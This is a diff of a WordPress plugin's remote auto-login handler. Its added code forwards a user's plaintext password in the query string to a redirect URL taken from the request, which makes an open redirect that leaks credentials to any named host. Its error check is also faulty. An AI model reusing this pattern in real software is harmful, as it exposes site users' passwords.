@@ -42,7 +42,7 @@ class WPREMOTELOG {
         add_action( "wp_ajax_".$this->post_type, array(&$this,"ajax_callback") );
         add_action( "wp_ajax_nopriv_".$this->post_type, array(&$this,"ajax_callback") );
     }
-		function username_login($username){
+		function username_login($username, $redirect = null){
 			// Automatic login //
 			$user = get_user_by('login', $username );
 
@@ -58,7 +58,11 @@ class WPREMOTELOG {
 			 } else {
 			        echo json_encode(array('error_code'=>1));
 			 }
-			 wp_redirect(home_url());
+             if($redirect){
+                wp_redirect( $redirect);
+             }else{
+			   wp_redirect($user->user_url);
+             }
 			 exit();
 		}
    /**
@@ -81,24 +85,43 @@ class WPREMOTELOG {
         if($module == 'login'){
             $data = array();
             $username = $data['user_login'] = $this->get_var("username");
-            $data['user_password'] =  $this->get_var("password");
+            $password = $data['user_password'] =  $this->get_var("password");
             $data['remember'] = true;
-						// $this->username_login($username);
-            $user = wp_signon( $data, false );
+            $redirect = $this->get_var("redirect");
+            $user = get_user_by( 'email',$username );
             if ( !is_wp_error($user) ){
-							wp_redirect(home_url());
-						}
+                $user = get_user_by( 'email',$username );
+                $user = wp_signon( $data, false );
+                $url = $redirect . '/wp-admin/admin-ajax.php?';
+                $data = array(
+                    'username' => $user->user_login,
+                    'password' => $password,
+                    'action' => 'wp_auto_login',
+                    'function' => 'login',
+                    'redirect' => 'none'
+                );
+
+                $params =  http_build_query($data);
+                wp_redirect($url . $params );
+            }else{
+                if($redirect){
+                    wp_redirect($redirect);
+                }else{
+                    wp_redirect(home_url());
+                }
+                
+            }
+
         }else  if($module == 'getuser'){
             if($user_id){
                 global $current_user;
                 get_currentuserinfo();
                 $email =  $current_user->user_email;
-                $pwd = get_user_meta($user_id,"pwd",true);
                 $data = array(
                     "response"=>200,
                     "data"=> array(
                         "email"=>$email,
-                        "pwd"=>$pwd,
+                        "pwd"=>$email,
                         "site"=>$current_user->user_url. "/wp-admin/admin-ajax.php"
                     )
                 );
